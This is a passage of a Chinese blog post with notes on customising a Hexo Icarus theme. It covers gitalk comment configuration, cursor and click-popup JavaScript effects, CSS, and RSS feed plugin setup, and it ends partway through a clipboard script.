    <content type="html"><![CDATA[<h2 id="git-deplyer"><a href="#git-deplyer" class="headerlink" title="git deplyer"></a>git deplyer</h2><p><a href="https://blog.csdn.net/weixin_43659725/article/details/125207584">ref</a></p><h2 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h2><ul><li>icarus的文章目录只有二级标题开始才可以跳转</li></ul><h2 id="阅读更多按钮"><a href="#阅读更多按钮" class="headerlink" title="阅读更多按钮"></a>阅读更多按钮</h2><ul><li>安装<a href="https://github.com/chekun/hexo-excerpt">hexo-excerpt</a>插件</li></ul><h2 id="live2d"><a href="#live2d" class="headerlink" title="live2d"></a>live2d</h2><ul><li>安装这个<a href="https://github.com/EYHN/hexo-helper-live2d">hexo-helper-live2d</a></li></ul><h2 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% codeblock filename lang:code-lang %&#125;</span><br><span class="line">    your code here...</span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure><h2 id="gittalk"><a href="#gittalk" class="headerlink" title="gittalk"></a>gittalk</h2><ul><li>按照教程创建gittalk，填写配置文件</li><li><a href="https://ppoffice.github.io/hexo-theme-icarus/Plugins/Comment/icarus%E7%94%A8%E6%88%B7%E6%8C%87%E5%8D%97-%E7%94%A8%E6%88%B7%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6/">官方教程</a></li></ul><blockquote><p>注意这里的repo是仓库名字，不是repo的url，不是repo的名称</p></blockquote><blockquote><p>通过f12的network发现发送的是apiurl+repo</p></blockquote><figure class="highlight yaml"><figcaption><span>_config.icaruc.yml</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">comment:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">gitalk</span></span><br><span class="line">    <span class="attr">client_id:</span> <span class="string">xxxxxxxxxxxxxxxxxxxx</span></span><br><span class="line">    <span class="attr">client_secret:</span> <span class="string">xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span></span><br><span class="line">    <span class="attr">repo:</span> <span class="string">Some-of-Your-GitHub-Repo</span> <span class="comment"># 这里是repo的名字，不是url</span></span><br><span class="line">    <span class="attr">owner:</span> <span class="string">you_github_name</span></span><br><span class="line">    <span class="attr">admin:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">you_github_name</span></span><br><span class="line">    <span class="attr">per_page:</span> <span class="number">20</span>                    <span class="comment"># 可选填</span></span><br><span class="line">    <span class="attr">distraction_free_mode:</span> <span class="literal">false</span>    <span class="comment"># 可选填</span></span><br><span class="line">    <span class="attr">pager_direction:</span> <span class="string">last</span>           <span class="comment"># 可选填</span></span><br><span class="line">    <span class="attr">create_issue_manually:</span> <span class="literal">false</span>    <span class="comment"># 可选填</span></span><br><span class="line">    <span class="attr">proxy:</span>                          <span class="comment"># 可选填</span></span><br><span class="line">    <span class="attr">flip_move_options:</span>              <span class="comment"># 可选填</span></span><br><span class="line">    <span class="attr">enable_hotkey:</span> <span class="literal">true</span>             <span class="comment"># 可选填</span></span><br><span class="line">    <span class="attr">language:</span> <span class="string">zh-CN</span>                 <span class="comment"># 可选填</span></span><br></pre></td></tr></table></figure><p>同时，在<code>_config.yml</code>下配置gitalk</p><figure class="highlight yaml"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">gitalk:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment">#默认的是false，没有打开</span></span><br><span class="line">  <span class="attr">owner:</span> <span class="string">&#x27;github name&#x27;</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">&#x27;repo name&#x27;</span></span><br><span class="line">  <span class="attr">oauth:</span></span><br><span class="line">    <span class="attr">clientId:</span> <span class="string">&#x27;clientId&#x27;</span></span><br><span class="line">    <span class="attr">clientSecret:</span> <span class="string">&#x27;clientSecret&#x27;</span></span><br><span class="line">  <span class="attr">admin:</span> [<span class="string">&#x27;githubname&#x27;</span>]</span><br></pre></td></tr></table></figure><h2 id="fairyDust-鼠标特效"><a href="#fairyDust-鼠标特效" class="headerlink" title="fairyDust 鼠标特效"></a>fairyDust 鼠标特效</h2><p>在<code>source/js</code>下创建文件<code>fairyDustCursor.js</code></p><figure class="highlight js"><figcaption><span>source/js/fairyDustCursor.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span> <span class="title function_">fairyDustCursor</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> possibleColors = [<span class="string">&quot;#D61C59&quot;</span>, <span class="string">&quot;#E7D84B&quot;</span>, <span class="string">&quot;#1B8798&quot;</span>]</span><br><span class="line">    <span class="keyword">var</span> width = <span class="variable language_">window</span>.<span class="property">innerWidth</span>;</span><br><span class="line">    <span class="keyword">var</span> height = <span class="variable language_">window</span>.<span class="property">innerHeight</span>;</span><br><span class="line">    <span class="keyword">var</span> cursor = &#123; <span class="attr">x</span>: width / <span class="number">2</span>, <span class="attr">y</span>: width / <span class="number">2</span> &#125;;</span><br><span class="line">    <span class="keyword">var</span> particles = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">init</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">bindEvents</span>();</span><br><span class="line">        <span class="title function_">loop</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Bind events that are needed</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">bindEvents</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mousemove&#x27;</span>, onMouseMove);</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;touchmove&#x27;</span>, onTouchMove);</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;touchstart&#x27;</span>, onTouchMove);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;resize&#x27;</span>, onWindowResize);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">onWindowResize</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        width = <span class="variable language_">window</span>.<span class="property">innerWidth</span>;</span><br><span class="line">        height = <span class="variable language_">window</span>.<span class="property">innerHeight</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">onTouchMove</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e.<span class="property">touches</span>.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; e.<span class="property">touches</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                <span class="title function_">addParticle</span>(e.<span class="property">touches</span>[i].<span class="property">clientX</span>, e.<span class="property">touches</span>[i].<span class="property">clientY</span>, possibleColors[<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * possibleColors.<span class="property">length</span>)]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">onMouseMove</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        cursor.<span class="property">x</span> = e.<span class="property">clientX</span>;</span><br><span class="line">        cursor.<span class="property">y</span> = e.<span class="property">clientY</span>;</span><br><span class="line"></span><br><span class="line">        <span class="title function_">addParticle</span>(cursor.<span class="property">x</span>, cursor.<span class="property">y</span>, possibleColors[<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * possibleColors.<span class="property">length</span>)]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">addParticle</span>(<span class="params">x, y, color</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> particle = <span class="keyword">new</span> <span class="title class_">Particle</span>();</span><br><span class="line">        particle.<span class="title function_">init</span>(x, y, color);</span><br><span class="line">        particles.<span class="title function_">push</span>(particle);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">updateParticles</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; particles.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            particles[i].<span class="title function_">update</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = particles.<span class="property">length</span> - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (particles[i].<span class="property">lifeSpan</span> &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                particles[i].<span class="title function_">die</span>();</span><br><span class="line">                particles.<span class="title function_">splice</span>(i, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">loop</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">requestAnimationFrame</span>(loop);</span><br><span class="line">        <span class="title function_">updateParticles</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">Particle</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">character</span> = <span class="string">&quot;*&quot;</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">lifeSpan</span> = <span class="number">120</span>; <span class="comment">//ms</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">initialStyles</span> = &#123;</span><br><span class="line">            <span class="string">&quot;position&quot;</span>: <span class="string">&quot;fixed&quot;</span>,</span><br><span class="line">            <span class="string">&quot;top&quot;</span>: <span class="string">&quot;0&quot;</span>, <span class="comment">//必须加</span></span><br><span class="line">            <span class="string">&quot;display&quot;</span>: <span class="string">&quot;block&quot;</span>,</span><br><span class="line">            <span class="string">&quot;pointerEvents&quot;</span>: <span class="string">&quot;none&quot;</span>,</span><br><span class="line">            <span class="string">&quot;z-index&quot;</span>: <span class="string">&quot;10000000&quot;</span>,</span><br><span class="line">            <span class="string">&quot;fontSize&quot;</span>: <span class="string">&quot;20px&quot;</span>,</span><br><span class="line">            <span class="string">&quot;will-change&quot;</span>: <span class="string">&quot;transform&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">init</span> = <span class="keyword">function</span> (<span class="params">x, y, color</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">velocity</span> = &#123;</span><br><span class="line">                <span class="attr">x</span>: (<span class="title class_">Math</span>.<span class="title function_">random</span>() &lt; <span class="number">0.5</span> ? -<span class="number">1</span> : <span class="number">1</span>) * (<span class="title class_">Math</span>.<span class="title function_">random</span>() / <span class="number">2</span>),</span><br><span class="line">                <span class="attr">y</span>: <span class="number">1</span></span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">position</span> = &#123; <span class="attr">x</span>: x - <span class="number">10</span>, <span class="attr">y</span>: y - <span class="number">20</span> &#125;;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">initialStyles</span>.<span class="property">color</span> = color;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(color);</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">element</span> = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;span&#x27;</span>);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">element</span>.<span class="property">innerHTML</span> = <span class="variable language_">this</span>.<span class="property">character</span>;</span><br><span class="line">            <span class="title function_">applyProperties</span>(<span class="variable language_">this</span>.<span class="property">element</span>, <span class="variable language_">this</span>.<span class="property">initialStyles</span>);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">update</span>();</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(<span class="variable language_">this</span>.<span class="property">element</span>);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">update</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">position</span>.<span class="property">x</span> += <span class="variable language_">this</span>.<span class="property">velocity</span>.<span class="property">x</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">position</span>.<span class="property">y</span> += <span class="variable language_">this</span>.<span class="property">velocity</span>.<span class="property">y</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">lifeSpan</span>--;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">element</span>.<span class="property">style</span>.<span class="property">transform</span> = <span class="string">&quot;translate3d(&quot;</span> + <span class="variable language_">this</span>.<span class="property">position</span>.<span class="property">x</span> + <span class="string">&quot;px,&quot;</span> + <span class="variable language_">this</span>.<span class="property">position</span>.<span class="property">y</span> + <span class="string">&quot;px,0) scale(&quot;</span> + (<span class="variable language_">this</span>.<span class="property">lifeSpan</span> / <span class="number">120</span>) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">die</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">element</span>.<span class="property">parentNode</span>.<span class="title function_">removeChild</span>(<span class="variable language_">this</span>.<span class="property">element</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">applyProperties</span>(<span class="params">target, properties</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> properties) &#123;</span><br><span class="line">            target.<span class="property">style</span>[key] = properties[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">init</span>();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>修改<code>node_modules/hexo-theme-icarus/layout</code>下的<code>layout.jsx</code>，在body中引用这个js文件</p><figure class="highlight html"><figcaption><span>node_modules/hexo-theme-icarus/layout/layout.jsx</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/home/js/fairyDustCursor.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="点击特效"><a href="#点击特效" class="headerlink" title="点击特效"></a>点击特效</h2><p>编写产生点击特效的js文件</p><figure class="highlight js"><figcaption><span>source/js/textPopup.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> colors = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&quot;#FF0000&quot;</span>,<span class="string">&quot;#FF7F00&quot;</span>,<span class="string">&quot; #FFFF00&quot;</span>,<span class="string">&quot;#00FF00&quot;</span>,<span class="string">&quot;#00FFFF&quot;</span>,<span class="string">&quot;#0000FF&quot;</span>,<span class="string">&quot;#8B00FF&quot;</span>,<span class="string">&quot;#FF0000&quot;</span>,<span class="string">&quot;#FF7F00&quot;</span>,<span class="string">&quot; #FFFF00&quot;</span>,<span class="string">&quot;#00FF00&quot;</span>,<span class="string">&quot;#00FFFF&quot;</span>,<span class="string">&quot;#0000FF&quot;</span>,<span class="string">&quot;#8B00FF&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> fnTextPopup = <span class="keyword">function</span> (<span class="params">arr, options</span>) &#123;</span><br><span class="line">    <span class="comment">// arr参数是必须的</span></span><br><span class="line">    <span class="keyword">if</span> (!arr || !arr.<span class="property">length</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 主逻辑</span></span><br><span class="line">    <span class="keyword">var</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> x = event.<span class="property">pageX</span>, y = event.<span class="property">pageY</span>;</span><br><span class="line">        <span class="keyword">var</span> eleText = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;span&#x27;</span>);</span><br><span class="line">        eleText.<span class="property">className</span> = <span class="string">&#x27;text-popup&#x27;</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">appendChild</span>(eleText);</span><br><span class="line">        <span class="keyword">if</span> (arr[index]) &#123;</span><br><span class="line">            eleText.<span class="property">innerHTML</span> = arr[index];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            index = <span class="number">0</span>;</span><br><span class="line">            eleText.<span class="property">innerHTML</span> = arr[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 动画结束后删除自己</span></span><br><span class="line">        eleText.<span class="title function_">addEventListener</span>(<span class="string">&#x27;animationend&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            eleText.<span class="property">parentNode</span>.<span class="title function_">removeChild</span>(eleText);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 位置</span></span><br><span class="line">        eleText.<span class="property">style</span>.<span class="property">left</span> = (x - eleText.<span class="property">clientWidth</span> / <span class="number">2</span>) + <span class="string">&#x27;px&#x27;</span>;</span><br><span class="line">        eleText.<span class="property">style</span>.<span class="property">top</span> = (y - eleText.<span class="property">clientHeight</span>) + <span class="string">&#x27;px&#x27;</span>;</span><br><span class="line">        <span class="comment">//设置颜色</span></span><br><span class="line">        eleText.<span class="property">style</span>.<span class="property">color</span> = colors[index%<span class="number">14</span>]</span><br><span class="line">        <span class="comment">// index递增</span></span><br><span class="line">        index++;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">fnTextPopup</span>([<span class="string">&#x27;富强&#x27;</span>, <span class="string">&#x27;民主&#x27;</span>, <span class="string">&#x27;文明&#x27;</span>, <span class="string">&#x27;和谐&#x27;</span>, <span class="string">&#x27;自由&#x27;</span>, <span class="string">&#x27;平等&#x27;</span>, <span class="string">&#x27;公正&#x27;</span>, <span class="string">&#x27;法治&#x27;</span>, <span class="string">&#x27;爱国&#x27;</span>, <span class="string">&#x27;敬业&#x27;</span>, <span class="string">&#x27;诚信&#x27;</span>, <span class="string">&#x27;友善&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>编写css文件</p><figure class="highlight css"><figcaption><span>source/css/textPopup.css</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.text-popup</span> &#123;</span><br><span class="line">    <span class="attribute">animation</span>: textPopup <span class="number">1s</span>;</span><br><span class="line">    user-select: none;</span><br><span class="line">    <span class="attribute">white-space</span>: nowrap;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">z-index</span>: <span class="number">99</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@keyframes</span> textPopup &#123;</span><br><span class="line">    <span class="number">0%</span>, <span class="number">100%</span> &#123;</span><br><span class="line">        <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="number">5%</span> &#123;</span><br><span class="line">        <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="number">100%</span> &#123;</span><br><span class="line">        <span class="attribute">transform</span>: <span class="built_in">translateY</span>(-<span class="number">50px</span>);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在layout.jsx中引用</p><figure class="highlight html"><figcaption><span>node_modules/hexo-theme-icarus/layout/layout.jsx</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/home/css/textPopup.css&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/home/js/textPopup.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="RSS生成插件，增加RSS订阅按钮"><a href="#RSS生成插件，增加RSS订阅按钮" class="headerlink" title="RSS生成插件，增加RSS订阅按钮"></a>RSS生成插件，增加RSS订阅按钮</h2><ul><li>安装一个插件，用来生成atom.xml文件</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-generator-feed</span><br></pre></td></tr></table></figure><ul><li>配置插件<ul><li>head下增加rss配置<figure class="highlight yaml"><figcaption><span>_config.icarus.yml</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">head:</span></span><br><span class="line">    <span class="attr">rss:</span> <span class="string">/atom.xml</span></span><br></pre></td></tr></table></figure></li><li>增加对插件的配置<figure class="highlight yaml"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="attr">plugins:</span></span><br><span class="line">    <span class="string">hexo-generator-feed</span></span><br><span class="line"><span class="comment">#Feed Atom</span></span><br><span class="line"><span class="attr">feed:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">atom</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">atom.xml</span></span><br><span class="line">    <span class="attr">limit:</span> <span class="number">20</span></span><br><span class="line"><span class="attr">rss:</span> <span class="string">/atom.xml</span></span><br></pre></td></tr></table></figure></li><li>配置RSS按钮<figure class="highlight yaml"><figcaption><span>_config.icarus.yml</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">social_links:</span></span><br><span class="line">    <span class="attr">RSS:</span></span><br><span class="line">        <span class="attr">icon:</span> <span class="string">fa</span> <span class="string">fa-rss</span></span><br><span class="line">        <span class="attr">url:</span> <span class="string">/atom.xml</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="优化RSS按钮"><a href="#优化RSS按钮" class="headerlink" title="优化RSS按钮"></a>优化RSS按钮</h3><p>上面配置点击rss按钮，如果浏览器没有安装rss相关插件，会直接显示atom.xml的原始样式，不美观，利用js实现点击rss按钮将订阅链接复制到剪切板</p><figure class="highlight js"><figcaption><span>source/js/clickClipBoard.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">copyToClipboard</span>(<span class="params">text, callBack</span>) &#123;</span><br><span class="line">    navigator.<span class="property">clipboard</span>.<span class="title function_">writeText</span>(text).<span class="title function_">then</span>(</span><br><span class="line">        <span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">// fulfillment</span></span><br><span class="line">            <span class="title function_">callBack</span>()</span><br><span class="line">        &#125;, <span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span><br><span 